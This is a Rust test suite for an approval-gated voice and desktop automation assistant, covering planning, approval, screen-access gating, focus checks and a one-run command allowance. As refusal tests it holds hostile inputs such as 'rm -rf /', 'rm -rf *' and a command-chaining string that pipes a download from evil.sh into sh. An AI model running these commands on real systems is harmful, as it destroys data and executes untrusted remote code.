use super::*;
use std::os::unix::fs::PermissionsExt;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::{Duration, Instant};

#[derive(Default)]
struct FakeStt {
    transcript: Mutex<Option<Result<String, SttError>>>,
    starts: AtomicUsize,
    cancels: AtomicUsize,
}

impl Stt for FakeStt {
    fn start(&self) -> Result<(), SttError> {
        self.starts.fetch_add(1, Ordering::SeqCst);
        Ok(())
    }
    fn stop_print(&self) -> Result<String, SttError> {
        self.transcript
            .lock()
            .unwrap()
            .take()
            .unwrap_or(Err(SttError::NoSpeech))
    }
    fn cancel(&self) -> Result<(), SttError> {
        self.cancels.fetch_add(1, Ordering::SeqCst);
        Ok(())
    }
}

#[derive(Default)]
struct FakeLauncher {
    launched: Mutex<Vec<String>>,
    fail_on: Mutex<Option<String>>,
}

impl Launcher for FakeLauncher {
    fn launch(&self, a: &Action) -> Result<String, String> {
        if self.fail_on.lock().unwrap().as_deref() == Some(a.describe().as_str()) {
            return Err("boom".into());
        }
        self.launched.lock().unwrap().push(a.describe());
        Ok(format!("Launched {}", a.describe()))
    }
}

fn rig() -> (Service, Arc<FakeStt>, Arc<FakeLauncher>) {
    let (stt, l) = (
        Arc::new(FakeStt::default()),
        Arc::new(FakeLauncher::default()),
    );
    (Service::new(stt.clone(), l.clone(), None), stt, l)
}

fn wait_for(s: &Service, f: impl Fn(&Snapshot) -> bool) -> Snapshot {
    let end = Instant::now() + Duration::from_secs(20);
    loop {
        let snap = s.snapshot(0);
        if f(&snap) {
            return snap;
        }
        assert!(Instant::now() < end, "timed out; phase {:?}", snap.phase);
        thread::sleep(Duration::from_millis(20));
    }
}

#[test]
fn nothing_runs_without_approval() {
    let (s, _, l) = rig();
    let t = s
        .plan(
            "open firefox and search youtube for mars rover",
            Mode::Actions,
        )
        .unwrap();
    assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
    thread::sleep(Duration::from_millis(100));
    assert!(l.launched.lock().unwrap().is_empty());
    assert!(s.approve(t.id + 1).is_err(), "wrong id");
    s.approve(t.id).unwrap();
    let done = wait_for(&s, |x| x.phase == Phase::Completed);
    assert_eq!(l.launched.lock().unwrap().len(), 1);
    assert_eq!(done.task.unwrap().steps[0].status, "launched");
    assert!(
        s.approve(t.id).is_err(),
        "a finished task cannot be re-approved"
    );
}

#[test]
fn trusted_actions_run_at_once_but_work_and_bad_input_still_wait() {
    let (s, _, l) = rig();
    s.set_trust_actions(true);
    s.plan("open firefox", Mode::Actions).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    assert_eq!(l.launched.lock().unwrap().len(), 1);
    assert!(s.plan("run rm -rf /", Mode::Actions).is_err());
    assert_eq!(l.launched.lock().unwrap().len(), 1);
    s.set_trust_actions(false);
    s.plan("open firefox", Mode::Actions).unwrap();
    assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
}

struct FakePlanner(Result<tools::Reply, String>);

impl Planner for FakePlanner {
    fn plan(&self, _: &str, _: bool) -> Result<tools::Reply, String> {
        self.0.clone()
    }
    fn name(&self) -> String {
        "fake".into()
    }
}

struct ScreenPlanner {
    local: bool,
    replies: Mutex<Vec<String>>,
}

impl Planner for ScreenPlanner {
    fn plan(&self, _: &str, _: bool) -> Result<tools::Reply, String> {
        Ok(tools::Reply::Steps(vec![Action::Computer {
            app: "chrome".into(),
            goal: "press the button".into(),
        }]))
    }
    fn complete(&self, _: &str) -> Result<String, String> {
        Ok(self.replies.lock().unwrap().remove(0))
    }
    fn is_local(&self) -> bool {
        self.local
    }
    fn name(&self) -> String {
        "screen-fake".into()
    }
}

struct TwoScreens(Mutex<usize>);

impl crate::desktop::Desktop for TwoScreens {
    fn find_window(&self, _: &str) -> Result<crate::desktop::Win, String> {
        Ok(crate::desktop::Win {
            address: "0x1".into(),
            pid: 1,
            class: "chrome".into(),
            title: "Test".into(),
            id: "w".into(),
        })
    }
    fn observe(&self, _: &crate::desktop::Win) -> Result<crate::desktop::Observation, String> {
        let clicked = *self.0.lock().unwrap() > 0;
        Ok(crate::desktop::Observation {
            snapshot: "s".into(),
            title: "Test".into(),
            elements: vec![crate::desktop::Element {
                id: "e1".into(),
                reference: "@s:e1".into(),
                role: "link".into(),
                name: "Press me".into(),
                value: String::new(),
                actions: vec!["Click".into()],
            }],
            texts: vec![if clicked { "clicked" } else { "idle" }.into()],
        })
    }
    fn act(&self, _: &crate::desktop::Win, _: &crate::desktop::UiAct) -> Result<(), String> {
        *self.0.lock().unwrap() += 1;
        Ok(())
    }
}

fn screen_rig(local: bool) -> Service {
    let (s, _, _) = rig();
    s.set_desktop(Arc::new(TwoScreens(Mutex::new(0))));
    s.set_planner(Some(Arc::new(ScreenPlanner {
        local,
        replies: Mutex::new(vec![
            r#"{"do":"click","id":"e1"}"#.into(),
            r#"{"done":true,"evidence":"clicked"}"#.into(),
        ]),
    })));
    s
}

#[test]
fn screen_access_gating() {
    let s = screen_rig(false);
    let refused = s
        .plan("press the button in chrome", Mode::Actions)
        .unwrap_err();
    assert!(refused.contains("sends on-screen text"), "{refused}");
    assert_eq!(s.snapshot(0).phase, Phase::Idle);

    let s = screen_rig(true);
    s.set_trust_actions(true);
    let t = s.plan("press the button in chrome", Mode::Actions).unwrap();
    assert_eq!(
        s.snapshot(0).phase,
        Phase::AwaitingApproval,
        "ungranted app asks"
    );
    assert!(t.steps[0].risk.contains("screen"));
    s.cancel();

    s.set_computer_apps(vec!["chrome".into()]);
    s.plan("press the button in chrome", Mode::Actions).unwrap();
    let done = wait_for(&s, |x| x.phase == Phase::Completed);
    assert!(done.task.unwrap().summary.unwrap().contains("clicked"));
    assert!(done.events.iter().any(|e| e.kind == "verify"));
}

#[test]
fn remote_needs_opt_in() {
    let s = screen_rig(false);
    s.set_computer_remote(true);
    s.plan("press the button in chrome", Mode::Actions).unwrap();
    assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
}

#[test]
fn the_model_only_plans_what_the_rules_do_not_understand() {
    let (s, _, l) = rig();
    let terminal = Action::App {
        target: "terminal".into(),
    };
    let typed = Action::Type {
        text: "welcome back wiki".into(),
    };
    s.set_planner(Some(Arc::new(FakePlanner(Ok(tools::Reply::Steps(vec![
        terminal, typed,
    ]))))));
    let t = s
        .plan("pop open a shell and greet the wiki", Mode::Actions)
        .unwrap();
    assert_eq!(t.steps.len(), 2);
    assert_eq!(
        s.snapshot(0).phase,
        Phase::AwaitingApproval,
        "approval unless trusted"
    );
    s.cancel();
    let rules = s.plan("open firefox", Mode::Actions).unwrap();
    assert_eq!(
        rules.steps.len(),
        1,
        "rules win; the model was not consulted"
    );
    s.cancel();
    s.set_planner(Some(Arc::new(FakePlanner(Err("down".into())))));
    assert!(s.plan("do a barrel roll", Mode::Actions).is_err());
    assert!(
        s.snapshot(0)
            .events
            .iter()
            .any(|e| e.text.contains("Planner: down"))
    );
    assert!(l.launched.lock().unwrap().is_empty());
}

#[test]
fn dictation_is_not_a_command_and_plans_nothing() {
    let (s, _, l) = rig();
    s.set_planner(Some(Arc::new(FakePlanner(Ok(tools::Reply::Dictation)))));
    assert_eq!(
        s.plan_smart("remember to buy milk tomorrow").unwrap_err(),
        tools::NOT_A_COMMAND
    );
    s.set_planner(Some(Arc::new(FakePlanner(Err("model not loaded".into())))));
    assert_eq!(
        s.plan_smart("open a pull request").unwrap_err(),
        "Planner failed: model not loaded"
    );
    assert!(s.snapshot(0).task.is_none());
    s.set_planner(None);
    assert_eq!(
        s.plan_smart("remember to buy milk tomorrow").unwrap_err(),
        tools::NOT_A_COMMAND
    );
    assert!(
        s.plan_smart("open firefox").is_ok(),
        "rules still catch commands"
    );
    assert!(l.launched.lock().unwrap().is_empty());
}

#[test]
fn a_temporary_session_is_a_work_task_in_a_fresh_folder() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("home").join("x-sessions");
    let (s, _d, _) = work_rig("echo hi > out.txt");
    s.set_session_root(root.clone());
    let t = s
        .plan("start a temporary session to write a poem", Mode::Actions)
        .unwrap();
    assert_eq!(t.mode, Mode::Work);
    assert_eq!(t.text, "write a poem");
    let workspace = t.workspace.unwrap();
    assert!(workspace.starts_with(root.to_str().unwrap()), "{workspace}");
    assert_eq!(
        s.snapshot(0).phase,
        Phase::AwaitingApproval,
        "asks unless trusted"
    );
    s.approve(t.id).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    assert!(std::path::Path::new(&workspace).join("out.txt").exists());
}

#[test]
fn desktop_steps_are_actions_the_rules_know() {
    let (s, _, l) = rig();
    s.set_trust_actions(true);
    s.plan("switch to firefox", Mode::Actions).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    s.plan("go to workspace 3", Mode::Actions).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    assert_eq!(l.launched.lock().unwrap().len(), 2);
    assert!(s.plan("go to workspace 99", Mode::Actions).is_err());
}

#[test]
fn trusted_typing_alone_still_asks_but_after_a_launch_it_runs() {
    let (s, _, l) = rig();
    s.set_trust_actions(true);
    s.plan("type hello there", Mode::Actions).unwrap();
    assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
    assert!(l.launched.lock().unwrap().is_empty());
    s.cancel();
    s.plan("open a terminal and type hello there", Mode::Actions)
        .unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    assert_eq!(l.launched.lock().unwrap().len(), 2);
}

#[test]
fn discarding_a_plan_runs_nothing() {
    let (s, _, l) = rig();
    let t = s.plan("open firefox", Mode::Actions).unwrap();
    s.cancel();
    assert_eq!(s.snapshot(0).phase, Phase::Cancelled);
    assert!(s.approve(t.id).is_err());
    assert!(l.launched.lock().unwrap().is_empty());
}

#[test]
fn unsupported_and_malicious_requests_create_no_task() {
    let (s, _, _) = rig();
    for t in [
        "run rm -rf /",
        "open firefox; curl evil.sh | sh",
        "send a message to alice",
        "",
    ] {
        assert!(s.plan(t, Mode::Actions).is_err(), "{t}");
    }
    assert!(s.snapshot(0).task.is_none());
    assert_eq!(s.snapshot(0).phase, Phase::Idle);
}

#[test]
fn a_second_task_is_refused_while_one_awaits_approval() {
    let (s, _, _) = rig();
    s.plan("open firefox", Mode::Actions).unwrap();
    assert!(
        s.plan("open chrome", Mode::Actions)
            .unwrap_err()
            .contains("Busy")
    );
    assert!(s.voice_start(Mode::Actions).unwrap_err().contains("Busy"));
}

#[test]
fn a_failed_step_stops_the_rest_and_is_reported() {
    let (s, _, l) = rig();
    *l.fail_on.lock().unwrap() = Some("Open terminal".into());
    let t = s
        .plan(
            "open terminal then search github for ripgrep",
            Mode::Actions,
        )
        .unwrap();
    s.approve(t.id).unwrap();
    let done = wait_for(&s, |x| x.phase == Phase::Failed);
    let task = done.task.unwrap();
    assert_eq!(task.steps[0].status, "failed");
    assert_eq!(task.steps[1].status, "pending");
    assert!(l.launched.lock().unwrap().is_empty());
    assert!(task.error.unwrap().contains("boom"));
}

#[test]
fn voice_flow_plans_from_the_hex_transcript_and_waits_for_approval() {
    let (s, stt, l) = rig();
    *stt.transcript.lock().unwrap() = Some(Ok("Open Firefox".into()));
    s.voice_start(Mode::Actions).unwrap();
    assert_eq!(s.snapshot(0).phase, Phase::Listening);
    assert!(
        s.voice_start(Mode::Actions).is_err(),
        "no concurrent capture"
    );
    s.voice_stop().unwrap();
    let snap = wait_for(&s, |x| x.phase == Phase::AwaitingApproval);
    assert_eq!(snap.task.unwrap().text, "Open Firefox");
    assert!(
        l.launched.lock().unwrap().is_empty(),
        "voice alone never launches"
    );
}

#[test]
fn no_speech_returns_to_idle() {
    let (s, _, _) = rig();
    s.voice_start(Mode::Actions).unwrap();
    s.voice_stop().unwrap();
    wait_for(&s, |x| x.phase == Phase::Idle);
    assert!(
        s.snapshot(0)
            .events
            .iter()
            .any(|e| e.text.contains("No speech"))
    );
}

#[test]
fn cancelling_while_listening_discards_the_recording() {
    let (s, stt, _) = rig();
    s.voice_start(Mode::Work).unwrap();
    s.cancel();
    assert_eq!(s.snapshot(0).phase, Phase::Idle);
    assert_eq!(stt.cancels.load(Ordering::SeqCst), 1);
}

fn fake_opencode(dir: &std::path::Path, body: &str) -> PathBuf {
    let p = dir.join("opencode");
    std::fs::write(
        &p,
        format!(
            "#!/bin/sh\nif [ \"$2\" = \"--help\" ]; then echo '--standalone'; exit 0; fi\n{body}\n"
        ),
    )
    .unwrap();
    std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
    p
}

fn work_rig(body: &str) -> (Service, tempfile::TempDir, PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("repo");
    std::fs::create_dir(&repo).unwrap();
    for a in [
        &["init", "-q"][..],
        &["config", "user.email", "t@t"],
        &["config", "user.name", "t"],
    ] {
        assert!(
            std::process::Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(a)
                .status()
                .unwrap()
                .success()
        );
    }
    let exe = fake_opencode(dir.path(), body);
    let s = Service::new(
        Arc::new(FakeStt::default()),
        Arc::new(FakeLauncher::default()),
        Some(exe),
    );
    s.set_workspace(repo.to_str().unwrap()).unwrap();
    (s, dir, repo)
}

#[test]
fn a_refused_command_is_reported_and_can_be_allowed_for_one_rerun_only() {
    let (s, _d, repo) = work_rig(
        "printf '%s' \"$OPENCODE_CONFIG_CONTENT\" > policy.json\necho '{\"type\":\"tool_use\",\"part\":{\"tool\":\"bash\",\"state\":{\"status\":\"error\",\"error\":\"The user rejected permission to use this specific tool call.\",\"input\":{\"command\":\"make deploy\"}}}}'",
    );
    let t = s.plan("ship it", Mode::Work).unwrap();
    s.approve(t.id).unwrap();
    let done = wait_for(&s, |x| x.phase == Phase::Completed).task.unwrap();
    assert_eq!(done.blocked, vec!["make deploy".to_string()]);
    let first = std::fs::read_to_string(repo.join("policy.json")).unwrap();
    assert!(
        !first.contains("make deploy"),
        "not allowed before the person says so"
    );
    assert!(first.contains("\"external_directory\":\"deny\""));

    let rerun = s.allow_once(0).unwrap();
    assert_eq!(
        s.snapshot(0).phase,
        Phase::AwaitingApproval,
        "the rerun still asks"
    );
    s.approve(rerun.id).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    let second = std::fs::read_to_string(repo.join("policy.json")).unwrap();
    assert!(second.contains("\"make deploy\":\"allow\""));

    let again = s.plan("ship it", Mode::Work).unwrap();
    s.approve(again.id).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    let third = std::fs::read_to_string(repo.join("policy.json")).unwrap();
    assert!(
        !third.contains("\"make deploy\":\"allow\""),
        "the grant lasts one run"
    );
}

#[test]
fn wildcard_commands_cannot_be_allowed() {
    let (s, _d, _) = work_rig(
        "echo '{\"type\":\"tool_use\",\"part\":{\"tool\":\"bash\",\"state\":{\"status\":\"error\",\"error\":\"rejected permission\",\"input\":{\"command\":\"rm -rf *\"}}}}'",
    );
    let t = s.plan("clean", Mode::Work).unwrap();
    s.approve(t.id).unwrap();
    wait_for(&s, |x| x.phase == Phase::Completed);
    assert!(s.allow_once(0).is_err());
}

#[test]
fn work_requires_a_workspace_and_opencode() {
    let (s, _, _) = rig();
    assert!(
        s.plan("fix the bug", Mode::Work)
            .unwrap_err()
            .contains("workspace")
    );
    assert!(s.set_workspace("/").is_err());
}

#[test]
fn work_run_completes_with_changed_files() {
    let (s, _d, repo) =
        work_rig("echo hi > new.txt\necho '{\"type\":\"text\",\"part\":{\"text\":\"done\"}}'");
    let t = s.plan("add a file", Mode::Work).unwrap();
    s.approve(t.id).unwrap();
    let done = wait_for(&s, |x| x.phase == Phase::Completed).task.unwrap();
    assert_eq!(done.changed_files, Some(vec!["new.txt".to_string()]));
    assert!(repo.join("new.txt").exists());
}

#[test]
fn work_error_event_is_a_failure() {
    let (s, _d, _) =
        work_rig("echo '{\"type\":\"error\",\"error\":{\"message\":\"no provider\"}}'\nsleep 60");
    let t = s.plan("anything", Mode::Work).unwrap();
    s.approve(t.id).unwrap();
    let task = wait_for(&s, |x| x.phase == Phase::Failed).task.unwrap();
    assert!(task.error.unwrap().contains("no provider"));
}

#[test]
fn stop_cancels_a_running_task_and_reports_partial_changes() {
    let (s, _d, repo) = work_rig("echo partial > half.txt\necho '{}'\nsleep 60");
    let t = s.plan("long job", Mode::Work).unwrap();
    s.approve(t.id).unwrap();
    for _ in 0..100 {
        if repo.join("half.txt").exists() {
            break;
        }
        thread::sleep(Duration::from_millis(50));
    }
    thread::sleep(Duration::from_millis(300));
    s.cancel();
    let task = wait_for(&s, |x| x.phase == Phase::Cancelled).task.unwrap();
    assert_eq!(task.changed_files, Some(vec!["half.txt".to_string()]));
    assert!(task.summary.unwrap().contains("nothing was rolled back"));
}

#[test]
fn shutdown_stops_a_running_task() {
    let (s, _d, _) = work_rig("sleep 60");
    let t = s.plan("job", Mode::Work).unwrap();
    s.approve(t.id).unwrap();
    thread::sleep(Duration::from_millis(500));
    s.shutdown();
    assert!(!s.snapshot(0).phase.is_busy());
}

mod contextual {
    use super::*;
    use crate::context::Engine;
    use crate::context::tests::{ERROR, FakeA11y, FakeWindows, win};
    use crate::wm::View;

    /// Windows whose focus jumps to the browser after `flip_after` reads.
    struct Flipping {
        inner: Arc<FakeWindows>,
        reads: AtomicUsize,
        flip_after: usize,
    }

    impl crate::context::Windows for Flipping {
        fn view(&self) -> Result<View, crate::wm::WmError> {
            if self.reads.fetch_add(1, Ordering::SeqCst) >= self.flip_after {
                self.inner.focus(Some("0xb"));
            }
            self.inner.view()
        }
    }

    fn setup(flip_after: usize) -> (Service, Arc<FakeLauncher>, Arc<FakeWindows>, Arc<FakeA11y>) {
        let (s, _, l) = rig();
        let windows = FakeWindows::with(
            vec![
                win("0xa", 100, "code", "main.ts", 2),
                win("0xb", 200, "firefox", "Docs", 1),
            ],
            Some(0),
        );
        let a11y = FakeA11y::selecting(ERROR);
        let flipping = Arc::new(Flipping {
            inner: windows.clone(),
            reads: AtomicUsize::new(0),
            flip_after,
        });
        s.set_context(Arc::new(Engine::new(flipping, a11y.clone())));
        (s, l, windows, a11y)
    }

    #[test]
    fn search_this_on_github_uses_the_selection_after_approval() {
        let (s, l, ..) = setup(usize::MAX);
        let t = s.plan("X, search this on GitHub", Mode::Actions).unwrap();
        assert!(t.steps[0].title.contains("github"));
        assert!(
            t.steps[0].title.contains("Cannot read properties"),
            "the plan shows the text"
        );
        assert!(l.launched.lock().unwrap().is_empty());
        s.approve(t.id).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        let launched = l.launched.lock().unwrap().clone();
        assert_eq!(launched.len(), 1);
        assert!(launched[0].contains(ERROR));
    }

    #[test]
    fn no_selection_plans_nothing() {
        let (s, l, _, a11y) = setup(usize::MAX);
        a11y.set_text(None);
        let err = s.plan("search this on github", Mode::Actions).unwrap_err();
        assert!(err.contains("Nothing is selected in code"), "{err}");
        assert_eq!(s.snapshot(0).phase, Phase::Idle);
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn password_selection_is_refused() {
        let (s, l, _, a11y) = setup(usize::MAX);
        a11y.set(Ok(crate::context::a11y::Focus {
            role: "password text".into(),
            protected: true,
            selection: Some("hunter2".into()),
            ..Default::default()
        }));
        let err = s.plan("search this", Mode::Actions).unwrap_err();
        assert!(err.contains("sensitive"));
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn trusted_command_stops_when_focus_moved_during_the_command() {
        let (s, l, ..) = setup(1); // the capture is read 1, the recheck is read 2 and flips
        s.set_trust_actions(true);
        s.plan("search this on github", Mode::Actions).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Failed);
        let error = done.task.unwrap().error.unwrap();
        assert!(error.contains("Focus moved"), "{error}");
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn approved_command_stops_when_the_source_window_closed() {
        let (s, l, windows, _) = setup(usize::MAX);
        let t = s.plan("search this on github", Mode::Actions).unwrap();
        windows.close("0xa");
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Failed);
        assert!(
            done.task
                .unwrap()
                .error
                .unwrap()
                .contains("code was closed")
        );
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn approved_command_survives_the_approval_prompt_taking_focus() {
        let (s, l, windows, _) = setup(usize::MAX);
        let t = s.plan("search this on github", Mode::Actions).unwrap();
        windows.focus(Some("0xb"));
        s.approve(t.id).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(l.launched.lock().unwrap().len(), 1);
    }

    #[test]
    fn copy_is_a_verified_action() {
        let (s, l, ..) = setup(usize::MAX);
        let t = s.plan("copy this", Mode::Actions).unwrap();
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(done.task.unwrap().steps[0].status, "done");
        assert_eq!(l.launched.lock().unwrap().len(), 1);
    }

    #[test]
    fn busy_service_does_not_read_the_screen() {
        let (s, _, _, a11y) = setup(usize::MAX);
        s.plan("open firefox", Mode::Actions).unwrap();
        a11y.set(Err("must not be asked".into()));
        let err = s.plan("search this", Mode::Actions).unwrap_err();
        assert!(err.starts_with("Busy"), "{err}");
    }
}
